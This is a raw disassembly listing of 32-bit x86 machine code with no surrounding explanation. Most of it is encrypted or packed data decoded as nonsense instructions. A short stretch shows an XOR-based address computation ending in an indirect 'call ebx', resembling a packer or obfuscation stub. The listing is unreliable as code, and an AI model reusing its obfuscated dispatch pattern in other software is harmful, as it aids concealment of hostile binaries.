  415fbf:	lods   eax,DWORD PTR ds:[esi]
  415fc0:	xor    eax,0x9311cd3a
  415fc5:	dec    ebx
  415fc6:	aas    
  415fc7:	hlt    
  415fc8:	pop    ds
  415fc9:	ja     0x41601f
  415fcb:	push   edi
  415fcc:	mov    dh,BYTE PTR [eax+0x4e]
  415fcf:	(bad)  
  415fd0:	lds    esp,FWORD PTR [edx-0x17]
  415fd3:	jmp    0x33e353b2
  415fd8:	jg     0x41602a
  415fda:	(bad)  
  415fdb:	iret   
  415fdc:	adc    BYTE PTR [esi-0x63],bh
  415fdf:	fld    st(7)
  415fe1:	ret    0x9fd5
  415fe4:	fcom   QWORD PTR [eax+0x34]
  415fe7:	pop    edx
  415fe8:	xchg   ebx,eax
  415fe9:	das    
  415fea:	and    BYTE PTR [eax-0x25864c4a],0x29
  415ff1:	stc    
  415ff2:	dec    ecx
  415ff3:	dec    edi
  415ff4:	mov    esi,0x70c1d379
  415ff9:	js     0x415f8c
  415ffb:	xchg   esi,eax
  415ffc:	lds    eax,FWORD PTR [ebp+0x50c740ac]
  416002:	das    
  416003:	into   
  416004:	cmp    DWORD PTR [ecx+eiz*4],eax
  416007:	jmp    0x390a:0xea27f276
  41600e:	pop    es
  41600f:	mov    cl,0xac
  416011:	cld    
  416012:	or     BYTE PTR [ecx-0x49e84ffa],al
  416018:	jbe    0x415fa1
  41601a:	push   es
  41601b:	outs   dx,DWORD PTR gs:[esi]
  41601d:	aam    0xe
  41601f:	mov    edx,DWORD PTR [ecx]
  416021:	cmc    
  416022:	cmp    BYTE PTR [ebx+0x74],cl
  416025:	retf   0xb036
  416028:	scas   al,BYTE PTR es:[edi]
  416029:	out    0x67,al
  41602b:	cmc    
  41602c:	mov    esp,0xc61faf03
  416031:	push   esi
  416032:	cmp    BYTE PTR [edi],al
  416034:	js     0x416001
  416036:	xchg   BYTE PTR [ebx+0x726d7779],ah
  41603c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41603d:	xchg   ebx,eax
  41603e:	je     0x4160b7
  416040:	loope  0x41601e
  416042:	pop    ds
  416043:	out    0x3b,eax
  416045:	mov    dh,0x53
  416047:	out    0x56,al
  416049:	xchg   DWORD PTR [esi-0x25c75f80],esp
  41604f:	loope  0x4160b9
  416051:	push   esp
  416052:	pop    esi
  416053:	pop    esp
  416054:	sbb    ecx,DWORD PTR [edx]
  416056:	dec    edx
  416057:	push   ecx
  416058:	fs xor eax,0x3944d6c
  41605e:	push   esp
  41605f:	fwait
  416060:	loop   0x41607e
  416062:	or     bp,0x4a
  416066:	mov    bl,0x8b
  416068:	push   ebp
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160a1
  41609a:	and    DWORD PTR [edi+edi*8+0x707f17ca],ebx
  4160a1:	mov    ecx,0x2970707e
  4160a6:	sbb    BYTE PTR [edi+0x40],dh
  4160a9:	arpl   WORD PTR [edi+0x6c700228],cx
  4160af:	jle    0x416051
  4160b1:	hlt    
  4160b2:	not    dl
  4160b4:	jmp    0x40fd:0xf8ea2891
  4160bb:	xchg   edx,eax
  4160bc:	jne    0x4160db
  4160be:	xor    al,0xf6
  4160c0:	out    0x4b,al
  4160c2:	xchg   edx,eax
  4160c3:	adc    bh,BYTE PTR ds:0xe5b4d771
  4160c9:	mov    ds:0xd3789f82,eax
  4160ce:	ss (bad) 
  4160d0:	or     al,0x32
  4160d2:	mov    eax,ds:0x31e0ccef
  4160d7:	sub    bl,0x28
  4160da:	xchg   esi,eax
  4160db:	scas   eax,DWORD PTR es:[edi]
  4160dc:	clc    
  4160dd:	mov    dh,0x76
  4160df:	jbe    0x416094
  4160e1:	mov    ah,0xc9
  4160e3:	stc    
  4160e4:	xchg   ecx,eax
  4160e5:	lods   eax,DWORD PTR ss:[esi]
  4160e7:	cmp    al,0x65
  4160e9:	and    esp,DWORD PTR [eax-0x2d]
  4160ec:	mov    edx,0xbeb50df2
  4160f1:	jo     0x4160ad
  4160f3:	int3   
  4160f4:	fwait
  4160f5:	mov    BYTE PTR [esi-0x76],bh
  4160f8:	out    0xa2,eax
  4160fa:	bound  edx,QWORD PTR [edx-0x2f]
  4160fd:	std    
  4160fe:	and    eax,0x67
  416101:	loopne 0x4160dc
  416103:	in     al,dx
  416104:	mov    dl,BYTE PTR [edi+ebx*2+0x6c195257]
  41610b:	ss sti 
  41610d:	das    
  41610e:	xor    al,0xbd
  416110:	mov    DWORD PTR [ebx],ebp
  416112:	sbb    eax,0x1900800a
  416117:	sub    al,0x6d
  416119:	in     al,dx
  41611a:	or     esi,DWORD PTR ds:0x6f0f7fa3
  416120:	add    ebp,DWORD PTR [ebx-0x22]
  416123:	in     eax,dx
  416124:	mov    ds:0x13515ae3,al
  416129:	popf   
  41612a:	cs ins DWORD PTR es:[edi],dx
  41612c:	mov    al,ds:0x32d4727a
  416131:	pop    eax
  416132:	ret    0x573a
  416135:	pop    edx
  416136:	mov    ebp,0xce9efb1d
  41613b:	mov    bh,0x9e
  41613d:	or     eax,0xfb70d4da
  416142:	push   0x10b8e641
  416147:	into   
  416148:	adc    al,0x9
  41614a:	dec    esp
  41614b:	ret    0xfc94
  41614e:	sub    eax,0xee09e76e
  416153:	or     DWORD PTR [esi-0x143439fa],eax
  416159:	mov    edx,0xa76e170a
  41615e:	and    ebp,0xce883e9c
  416164:	cmp    ch,BYTE PTR [ebp+edx*2-0x1053b9e7]
  41616b:	mov    edi,0xb86f43aa
  416170:	scas   eax,DWORD PTR es:[edi]
  416171:	sbb    eax,0x27202957
  416176:	jbe    0x41614c
  416178:	mov    al,ds:0x7bec1053
  41617d:	daa    
  41617e:	test   eax,0x9fd4d19e
  416183:	sbb    ah,cl
  416185:	pop    es
  416186:	test   dl,cl
  416188:	and    esp,edx
  41618a:	xlat   BYTE PTR ds:[ebx]
  41618b:	aas    
  41618c:	out    0x72,eax
  41618e:	mov    esi,0xb193aaee
  416193:	jbe    0x41620f
  416195:	nop
  416196:	mov    dh,0xca
  416198:	mov    dh,0xb8
  41619a:	and    BYTE PTR [ebp+0x57],bh
  41619d:	pop    ss
  41619e:	fistp  DWORD PTR [ecx-0x52]
  4161a1:	xor    eax,0x6e5ff522
  4161a6:	mov    ss,edx
  4161a8:	push   esi
  4161a9:	stc    
  4161aa:	fwait
  4161ab:	jl     0x41622b
  4161ad:	cmp    DWORD PTR [eax],edi
  4161af:	push   0x783adc57
  4161b4:	retf   
  4161b5:	fldcw  WORD PTR ds:0x275aba05
  4161bb:	sub    edx,DWORD PTR [eax]
  4161bd:	mov    al,0x79
  4161bf:	ret    0x5e18
  4161c2:	loopne 0x416236
  4161c4:	pop    es
  4161c5:	lahf   
  4161c6:	or     BYTE PTR [edi-0x31],cl
  4161c9:	sub    DWORD PTR [ebx],ebp
  4161cb:	les    edx,FWORD PTR [eax+0x7]
  4161ce:	pop    edi
  4161cf:	pop    ebp
  4161d0:	ret    
  4161d1:	das    
  4161d2:	(bad)  
  4161d3:	jnp    0x416197
  4161d5:	addr16 cmp eax,0x6e3678a5
  4161db:	out    0x55,eax
  4161dd:	cmp    al,0x7a
  4161df:	cmp    al,0xd7
  4161e1:	xchg   esp,eax
  4161e2:	mov    eax,0x2dc272bd
  4161e7:	retf   0x30e5
  4161ea:	inc    eax
  4161eb:	cld    
  4161ec:	outs   dx,BYTE PTR ds:[esi]
  4161ed:	addr16 push 0x1f
  4161f0:	out    dx,al
  4161f1:	rcr    ecx,0x51
  4161f4:	cdq    
  4161f5:	sub    dl,bh
  4161f7:	inc    edi
  4161f8:	stos   DWORD PTR es:[edi],eax
  4161f9:	mov    ?,WORD PTR [ecx-0x8]
  4161fc:	or     ah,cl
  4161fe:	pop    ebx
  4161ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416200:	mov    ecx,?
  416202:	xor    bl,BYTE PTR [ecx-0x12]
  416205:	jne    0x4161a5
  416207:	ficom  WORD PTR [ebx+0x4c]
  41620a:	or     cl,ch
  41620c:	vandnps ymm0,ymm4,YMMWORD PTR ds:0x182dd7f6
  416214:	mov    ch,0xcc
  416216:	mov    dh,0xdf
  416218:	inc    esi
  416219:	mov    ah,0x43
  41621b:	mov    esi,0x3542ff82
  416220:	iret   
  416221:	jmp    0x90db:0x7739f376
  416228:	xor    al,0xf2
  41622a:	push   ds
  41622b:	mov    dl,bh
  41622d:	hlt    
  41622e:	xchg   esp,eax
  41622f:	jae    0x416268
  416231:	nop
  416232:	mov    ch,BYTE PTR [ebp-0x3a6c2e8b]
  416238:	sbb    eax,0x1b419811
  41623d:	pop    ds
  41623e:	inc    esp
  41623f:	sbb    al,BYTE PTR [ebx+0x23da2659]
  416245:	and    al,0xac
  416247:	repnz mov dl,0x71
  41624a:	sbb    DWORD PTR ds:0x611ceec2,0x19
  416251:	and    ebp,DWORD PTR [eax]
  416253:	cld    
  416254:	fimul  DWORD PTR [edx-0x14]
  416257:	dec    ebp
  416258:	pop    esi
  416259:	(bad)  
  41625a:	jns    0x416227
  41625c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41625d:	ret    0xa38a
  416260:	stos   BYTE PTR es:[edi],al
  416261:	pop    esp
  416262:	and    al,BYTE PTR [edi]
  416264:	cli    
  416265:	fnstsw WORD PTR [ebx+0x75]
  416268:	inc    ebp
  416269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41626a:	push   eax
  41626b:	or     al,0x4
  41626d:	push   0x7f123c5e
  416272:	jge    0x4162c6
  416274:	cmp    DWORD PTR [edi],0xffffffa5
  416277:	xor    DWORD PTR [edx+0x6511d546],esi
  41627d:	inc    edx
  41627e:	mov    bh,0x9d
  416280:	mov    ebp,0xbe616f7f
  416285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416286:	cs mov eax,0xa2c08abf
  41628c:	inc    ebp
  41628d:	sub    cl,BYTE PTR [ebx+0x682165c0]
  416293:	sbb    al,0x4e
  416295:	js     0x4162f9
  416297:	addr16 sahf 
  416299:	(bad)  
  41629b:	test   DWORD PTR [ebx+ebx*8],esp
  41629e:	jge    0x4162c6
  4162a0:	pop    ss
  4162a1:	test   eax,0xac94ceca
  4162a6:	ja     0x4162d7
  4162a8:	leave  
  4162a9:	inc    ecx
  4162aa:	hlt    
  4162ab:	mov    DWORD PTR fs:[ebp+0x49],esi
  4162af:	cwde   
  4162b0:	cmp    bl,BYTE PTR [ebx+eiz*8+0x4f]
  4162b4:	nop
  4162b5:	mov    dh,0x1f
  4162b7:	xor    al,0x83
  4162b9:	adc    al,BYTE PTR [ebx-0x189be5e2]
  4162bf:	cmp    eax,0xc9c5026d
  4162c4:	push   DWORD PTR [edi]
  4162c6:	xchg   sp,ax
  4162c8:	jno    0x4162b8
  4162ca:	inc    ebx
  4162cb:	pushf  
  4162cc:	fwait
  4162cd:	xchg   esi,eax
  4162ce:	or     ah,ah
  4162d0:	mov    BYTE PTR [esi],bl
  4162d2:	(bad)  
  4162d3:	or     ch,BYTE PTR [edx-0x65]
  4162d6:	sbb    eax,0xe82ee504
  4162db:	fiadd  WORD PTR [esi-0x25162b37]
  4162e1:	add    BYTE PTR [ebx+eiz*8-0x75],dl
  4162e5:	fwait
  4162e6:	lds    edi,FWORD PTR [edi]
  4162e8:	test   eax,0x720f3df0
  4162ed:	inc    edx
  4162ee:	mov    bh,0xab
  4162f0:	les    edi,FWORD PTR [ecx]
  4162f2:	cmp    BYTE PTR [ebx-0x46],ah
  4162f5:	pop    ds
  4162f6:	xlat   BYTE PTR ds:[ebx]
  4162f7:	not    eax
  4162f9:	push   0xbc7ab7b8
  4162fe:	dec    eax
  4162ff:	add    ebx,ebp
  416301:	jge    0x4162be
  416303:	push   es
  416304:	jbe    0x416339
  416306:	adc    BYTE PTR [esi+0x4cd1fa1d],al
  41630c:	fimul  WORD PTR [ecx+0x116d261f]
  416312:	mov    eax,0x20c6debc
  416317:	ret    
  416318:	mov    ds:0x4ee99bcc,eax
  41631d:	cld    
  41631e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41631f:	cmp    BYTE PTR [edi],cl
  416321:	push   eax
  416322:	repz dec ecx
  416324:	mov    cl,0xe1
  416326:	mov    eax,ebx
  416328:	xchg   ebx,eax
  416329:	popa   
  41632a:	nop
  41632b:	iret   
  41632c:	popf   
  41632d:	rol    DWORD PTR [eax+ecx*8],cl
  416330:	dec    esp
  416331:	jbe    0x4162dc
  416333:	jp     0x4163a2
  416335:	or     eax,0x801aef3b
  41633a:	(bad)  
  41633c:	test   al,0x74
  41633e:	int3   
  41633f:	and    edi,DWORD PTR [ebx+0x1c6f9b08]
  416345:	repz imul edi,DWORD PTR [ecx+0x87561b8],0xb33f2a77
  416350:	jns    0x41633e
  416352:	shr    ebx,0xf7
  416355:	outs   dx,DWORD PTR es:[esi]
  416357:	(bad)  
  416358:	aas    
  416359:	fld    DWORD PTR [ecx+0x1e293a4d]
  41635f:	sahf   
  416360:	jnp    0x416384
  416362:	xchg   ecx,eax
  416363:	cmp    eax,0x788c3712
  416368:	fist   DWORD PTR [ecx]
  41636a:	push   edi
  41636b:	clc    
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0xae84c841
  4163bf:	iret   
  4163c0:	cmp    al,0x13
  4163c2:	adc    al,0x7f
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416412
  4163ca:	inc    edx
  4163cb:	or     DWORD PTR ds:0xec4579e2,ecx
  4163d1:	mov    ecx,0x7dd231d3
  4163d6:	pop    ds
  4163d7:	jmp    0xdc86:0xd00afebf
  4163de:	loop   0x416414
  4163e0:	xchg   edi,eax
  4163e1:	inc    ecx
  4163e2:	clc    
  4163e3:	call   0xd9abf663
  4163e8:	and    edx,ebp
  4163ea:	mov    eax,ds:0x5fa9f552
  4163ef:	sbb    BYTE PTR [edi-0x2f],ch
  4163f2:	icebp  
  4163f3:	mov    eax,ds:0xbf7ce91d
  4163f8:	xor    eax,0xe0bdef74
  4163fd:	xchg   DWORD PTR [edi+0x23],ebp
  416400:	outs   dx,BYTE PTR ds:[esi]
  416401:	(bad)  
  416402:	int3   
  416403:	inc    eax
  416404:	pop    ebx
  416405:	js     0x4163d6
  416407:	icebp  
  416408:	psubusw mm7,mm2
  41640b:	or     al,BYTE PTR [ecx+0x4d]
  41640e:	adc    ah,ah
  416410:	jle    0x416433
  416412:	not    DWORD PTR [edx+0x788b31e6]
  416418:	sbb    esp,DWORD PTR [edi]
  41641a:	scas   al,BYTE PTR es:[edi]
  41641b:	add    DWORD PTR [ebx+ebx*2],0xe9eba148
  416422:	sub    eax,0xc688f6c9
  416427:	stos   DWORD PTR es:[edi],eax
  416428:	push   eax
  416429:	xor    bh,bh
  41642b:	jmp    0x4163ad
  41642d:	cmc    
  41642e:	xchg   edx,eax
  41642f:	sbb    al,0xe
  416431:	mov    edx,0x833f6a15
  416436:	das    
  416437:	sbb    al,0x71
  416439:	add    BYTE PTR [esp+ecx*4],0x3d
  41643d:	xchg   edx,eax
  41643e:	pop    ebp
  41643f:	retf   0xdc06
  416442:	test   al,0xf1
  416444:	xchg   edi,eax
  416445:	fdivr  QWORD PTR [ecx+0x7aa17571]
  41644b:	push   edx
  41644c:	popf   
  41644d:	cld    
  41644e:	int3   
  41644f:	jg     0x416432
  416451:	test   al,0xaa
  416453:	xchg   edi,eax
  416454:	ret    
  416455:	addr16 call 0xbdad:0x1d7898a
  41645d:	xchg   DWORD PTR [esi+0x270a83b0],eax
  416463:	cdq    
  416464:	aam    0x78
  416466:	fadd   DWORD PTR [ebx]
  416468:	aaa    
  416469:	sti    
  41646a:	stos   BYTE PTR es:[edi],al
  41646b:	fcom   QWORD PTR [ecx+edi*4+0x40bba89b]
  416472:	pushf  
  416473:	hlt    
  416474:	inc    esp
  416475:	loope  0x41644e
  416477:	dec    ebx
  416478:	and    al,0xdd
  41647a:	neg    BYTE PTR [ecx+0x6d380cd0]
  416480:	in     al,0x68
  416482:	inc    ecx
  416483:	sub    dh,BYTE PTR [edi-0x2a]
  416486:	cdq    
  416487:	pop    edi
  416488:	mov    ebx,0xa1b97a7b
  41648d:	pop    ds
  41648e:	shl    DWORD PTR [esi+0x5180d33e],1
  416494:	or     DWORD PTR [ecx+0x40],edi
  416497:	push   edi
  416498:	mov    edi,0xce0808cb
  41649d:	pop    esp
  41649e:	lods   eax,DWORD PTR ds:[esi]
  41649f:	pop    ecx
  4164a0:	lock stos BYTE PTR es:[edi],al
  4164a2:	cmp    bl,BYTE PTR [eax*2+0x28717e2e]
  4164a9:	push   cs
  4164aa:	daa    
  4164ab:	xchg   BYTE PTR [ecx],cl
  4164ad:	push   ebx
  4164ae:	out    0xbb,eax
  4164b0:	jno    0x4164ee
  4164b2:	test   BYTE PTR [ecx],0xd3
  4164b5:	xchg   DWORD PTR [ecx+0x58],ebx
  4164b8:	out    0xe3,eax
  4164ba:	mov    ds:0xa7aed743,eax
  4164bf:	mov    edi,0x46a69895
  4164c4:	test   ecx,0xa9b29672
  4164ca:	dec    ebp
  4164cb:	add    dh,ah
  4164cd:	aas    
  4164ce:	or     ecx,DWORD PTR [edx]
  4164d0:	nop/reserved BYTE PTR [edi+0x55f75c52]
  4164d7:	js     0x41645c
  4164d9:	jge    0x416506
  4164db:	(bad)  
  4164dc:	(bad)  
  4164dd:	sbb    bh,BYTE PTR [edi-0x2316e365]
  4164e3:	icebp  
  4164e4:	cs ins BYTE PTR es:[edi],dx
  4164e6:	xchg   esi,eax
  4164e7:	mov    ds:0xd724fed4,al
  4164ec:	jne    0x4164b5
  4164ee:	or     cl,ah
  4164f0:	mov    bh,0x24
  4164f2:	mov    esi,DWORD PTR ds:[edi]
  4164f5:	xchg   ebx,eax
  4164f6:	dec    eax
  4164f7:	dec    esp
  4164f8:	loope  0x4164b9
  4164fa:	and    DWORD PTR [ebx],ebp
  4164fc:	cld    
  4164fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164fe:	push   0x5ed6904f
  416503:	dec    ecx
  416504:	stos   DWORD PTR es:[edi],eax
  416505:	adc    esp,0x41a074fe
  41650b:	jecxz  0x416505
  41650d:	fimul  DWORD PTR [esi+0x71c0fb55]
  416513:	or     eax,0xcb58b354
  416518:	cs scas eax,DWORD PTR es:[edi]
  41651a:	jle    0x416573
  41651c:	fdiv   st,st(3)
  41651e:	aas    
  41651f:	in     eax,dx
  416520:	lock scas al,BYTE PTR es:[edi]
  416522:	push   ebp
  416523:	mov    edx,0x802af526
  416528:	aam    0xf8
  41652a:	ins    BYTE PTR es:[edi],dx
  41652b:	dec    edi
  41652c:	(bad)  
  41652d:	fcos   
  41652f:	ror    DWORD PTR [edi+0x71],0xf7
  416533:	sti    
  416534:	cmc    
  416535:	pop    ebp
  416536:	add    al,0x75
  416538:	repnz loop 0x4164bd
  41653b:	bound  ebp,QWORD PTR [ebp+0x36]
  41653e:	sub    eax,DWORD PTR [edi+0x7d]
  416541:	xchg   esi,eax
  416542:	pop    edi
  416543:	test   DWORD PTR [ebp-0x31],ebx
  416546:	in     eax,0xfc
  416548:	in     al,0xdf
  41654a:	fdiv   QWORD PTR [ecx+0x7b7cca69]
  416550:	sub    cl,BYTE PTR [edi]
  416552:	pop    eax
  416553:	or     ch,BYTE PTR [ebx-0x5c]
  416556:	adc    BYTE PTR [edi],0x3f
  416559:	pop    ss
  41655a:	stos   DWORD PTR es:[edi],eax
  41655b:	fs mov ah,0x50
  41655e:	(bad)  
  416560:	or     BYTE PTR [edx+0x39],al
  416563:	push   esi
  416564:	fwait
  416565:	push   ds
  416566:	sar    DWORD PTR [ebp+0x5b],0xc8
  41656a:	xchg   ebx,eax
  41656b:	hlt    
  41656c:	iret   
  41656d:	xchg   ebx,eax
  41656e:	cmp    edi,DWORD PTR es:[edx+0x10]
  416572:	mov    edx,0xca12d952
  416577:	jns    0x416527
  416579:	test   al,0x17
  41657b:	daa    
  41657c:	dec    esi
  41657d:	adc    DWORD PTR [edx-0xd],0x79ead264
  416584:	std    
  416585:	mov    ds:0xd58b3b57,al
  41658a:	inc    esi
  41658b:	add    ebp,ecx
  41658d:	mov    dh,0x24
  41658f:	push   ds
  416590:	shr    BYTE PTR [edx-0x3ed9e686],0x7a
  416597:	push   ebx
  416598:	mov    DWORD PTR [ebx+ebx*8-0x13e3dced],0x594000c5
  4165a3:	test   BYTE PTR [esi],dh
  4165a5:	mov    ds:0xb42bc660,eax
  4165aa:	jae    0x41661c
  4165ac:	xchg   edi,eax
  4165ad:	cmp    al,0x51
  4165af:	repnz lods eax,DWORD PTR ds:[esi]
  4165b1:	ins    BYTE PTR es:[edi],dx
  4165b2:	pusha  
  4165b3:	push   esp
  4165b4:	es mov esp,0x124497e5
  4165ba:	and    BYTE PTR [eax-0x35c2b73],bl
  4165c0:	jle    0x41660c
  4165c2:	out    0xf6,eax
  4165c4:	scas   al,BYTE PTR es:[edi]
  4165c5:	xchg   ebx,eax
  4165c6:	xor    al,0xa0
  4165c8:	imul   ebx,DWORD PTR [edi],0xffffffba
  4165cb:	mov    eax,0xaa1dca73
  4165d0:	sbb    al,0xbb
  4165d2:	cld    
  4165d3:	rcl    DWORD PTR [edx],0x2b
  4165d6:	push   esi
  4165d7:	mov    ebx,0xd93c325
  4165dc:	push   ds
  4165dd:	outs   dx,BYTE PTR ds:[esi]
  4165de:	not    DWORD PTR [eax+0x45262e5a]
  4165e4:	(bad)  
  4165e5:	mov    ah,0x1d
  4165e7:	sub    BYTE PTR [ebp+0x1e],cl
  4165ea:	iret   
  4165eb:	jmp    0x5cd919f3
  4165f0:	xor    BYTE PTR [eax-0x622cc30f],0xf3
  4165f7:	adc    al,BYTE PTR [ebp-0x7f6de7bb]
  4165fd:	and    al,0x78
  4165ff:	(bad)  
  416601:	jnp    0x4165e1
  416603:	mov    gs,WORD PTR [ebx-0x3f]
  416606:	ja     0x416687
  416608:	ja     0x4165f5
  41660a:	test   al,0x76
  41660c:	loope  0x416663
  41660e:	xchg   esp,eax
  41660f:	xlat   BYTE PTR ds:[ebx]
  416610:	push   ds
  416611:	fcomp  DWORD PTR [edx+0x41]
  416614:	pop    ecx
  416615:	xor    ah,BYTE PTR [edi-0x760ee563]
  41661b:	pop    ecx
  41661c:	cli    
  41661d:	repz jmp 0x4165b5
  416620:	adc    dl,bl
  416622:	ror    BYTE PTR [edi],1
  416624:	fcom   QWORD PTR [bx+di]
  416627:	jmp    0x40d427af
  41662c:	std    
  41662d:	jno    0x4165bf
  41662f:	ret    0x9eba
  416632:	(bad)  
  416633:	or     bl,ch
  416635:	ret    
  416636:	ja     0x41663c
  416638:	pusha  
  416639:	mov    DWORD PTR [edx-0x50],ebp
  41663c:	lds    ebp,FWORD PTR [esi]
  41663e:	mov    ch,0xcf
  416640:	lods   al,BYTE PTR ds:[esi]
  416641:	std    
  416642:	xchg   esp,eax
  416643:	pop    ebp
  416644:	rcr    BYTE PTR [eax+ebx*8],cl
  416647:	push   ds
  416648:	xchg   ebx,eax
  416649:	cld    
  41664a:	fucom  st(1)
  41664c:	dec    ebx
  41664d:	pusha  
  41664e:	add    al,BYTE PTR [ebp+0x3d47829c]
  416654:	lock xchg edi,eax
  416656:	std    
  416657:	and    eax,0xcd7fb59a
  41665c:	std    
  41665d:	rol    DWORD PTR [eax-0x13],0x32
  416661:	add    eax,0x28249e4c
  416666:	adc    edi,DWORD PTR [ebx-0x24d0712f]
  41666c:	xor    al,0x73
  41666e:	jns    0x416693
  416670:	inc    eax
  416671:	push   ss
  416672:	cmp    DWORD PTR [ebp-0x17],ecx
  416675:	push   cs
  416676:	mov    esp,DWORD PTR [ebp+0x2b]
  416679:	fisub  DWORD PTR [eax]
  41667b:	adc    al,0xa7
  41667d:	cdq    
  41667e:	sub    BYTE PTR ds:0x540b88ea,0x2a
  416685:	rol    BYTE PTR ds:0xfcb2c139,1
  41668c:	call   0xa6a:0x922cc4f5
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x4166b5
  4166ae:	arpl   WORD PTR [eax+0x7f125c83],si
  4166b4:	jo     0x41666f
  4166b6:	jle    0x416728
  4166b8:	jo     0x416729
  4166ba:	lea    edx,[ebx-0x1e]
  4166bd:	or     edx,DWORD PTR [esi]
  4166bf:	outs   dx,BYTE PTR ds:[esi]
  4166c0:	dec    edx
  4166c1:	inc    esi
  4166c2:	mov    edi,0x5f471e87
  4166c7:	movzx  esi,BYTE PTR [edx]
  4166ca:	push   esp
  4166cb:	dec    eax
  4166cc:	dec    esi
  4166cd:	rcr    DWORD PTR [edi+0x56d9c600],0x81
  4166d4:	xchg   ecx,eax
  4166d5:	dec    esp
  4166d6:	pop    ds
  4166d7:	lds    ebp,FWORD PTR [eax+edi*4]
  4166da:	popa   
  4166db:	shr    DWORD PTR [ecx],cl
  4166dd:	and    edi,ecx
  4166df:	ja     0x416706
  4166e1:	inc    edi
  4166e2:	(bad)  
  4166e3:	rcr    DWORD PTR ds:0x42f8acb0,1
  4166e9:	shl    DWORD PTR [ecx+0x3b4225e0],cl
  4166ef:	fiadd  WORD PTR [ebx]
  4166f1:	mov    bl,0xc1
  4166f3:	or     eax,0xceae8806
  4166f8:	jae    0x416729
  4166fa:	pop    ds
  4166fb:	mov    ah,0xda
  4166fd:	cdq    
  4166fe:	jecxz  0x4166dd
  416700:	lods   eax,DWORD PTR ds:[esi]
  416701:	mov    ecx,edi
  416703:	in     eax,dx
  416704:	sub    eax,0x6c9d8d5d
  416709:	push   cs
  41670a:	iret   
  41670b:	cmp    al,0x58
  41670d:	test   al,0xb5
  41670f:	or     al,0xa
  416711:	pop    esp
  416712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416713:	mov    al,0x49
  416715:	pop    eax
  416716:	pushf  
  416717:	push   cs
  416718:	cli    
  416719:	out    dx,eax
  41671a:	dec    edi
  41671b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41671c:	lock cmp eax,0xa4711568
  416722:	dec    edi
  416723:	add    al,ch
  416725:	dec    ebx
  416726:	call   0xf38d:0xf40d688d
  41672d:	in     eax,dx
  41672e:	jbe    0x416726
  416730:	jge    0x4166ff
  416732:	push   ecx
  416733:	push   0xa5adcf8b
  416738:	cmc    
  416739:	aam    0x70
  41673b:	inc    esp
  41673c:	scas   al,BYTE PTR es:[edi]
  41673d:	inc    edi
  41673e:	add    DWORD PTR [edx],0xffffffbc
  416741:	sub    eax,0xb364c63f
  416746:	rcl    bh,1
  416748:	cmp    BYTE PTR [edi-0x1b],cl
  41674b:	cmp    DWORD PTR [eax+0x5ea9c6da],edx
  416751:	div    BYTE PTR [esp+esi*1]
  416754:	ficomp DWORD PTR [ecx+edx*4]
  416757:	rol    BYTE PTR [ebx],0xf1
  41675a:	sub    ch,cl
  41675c:	icebp  
  41675d:	mov    gs,WORD PTR [edi+0x7d3c4669]
  416763:	xor    BYTE PTR [edi-0x66e23c0f],dl
  416769:	aaa    
  41676a:	int    0xf
  41676c:	mov    bh,0xdb
  41676e:	xacquire xchg DWORD PTR [edi],esp
  416771:	mov    eax,ds:0x58c8cbdf
  416776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416777:	mov    ebx,0xd703bfd0
  41677c:	(bad)  
  41677d:	pop    ds
  41677e:	mov    esp,0xfc13b3a1
  416783:	mov    ah,0x57
  416785:	push   ebp
  416786:	push   es
  416787:	in     al,0x4d
  416789:	mov    edi,0xdb76833e
  41678e:	icebp  
  41678f:	mov    ebp,0x7b8b6ec0
  416794:	add    cl,0x1a
  416797:	mov    eax,ds:0x6c0a30e3
  41679c:	sub    DWORD PTR [ebx-0x2c044a27],0xffffff89
  4167a3:	jnp    0x416776
  4167a5:	retf   
  4167a6:	jb     0x416819
  4167a8:	add    esp,DWORD PTR [edi-0x6e87228]
  4167ae:	inc    ebx
  4167af:	push   0x6a
  4167b1:	inc    ebx
  4167b2:	pushf  
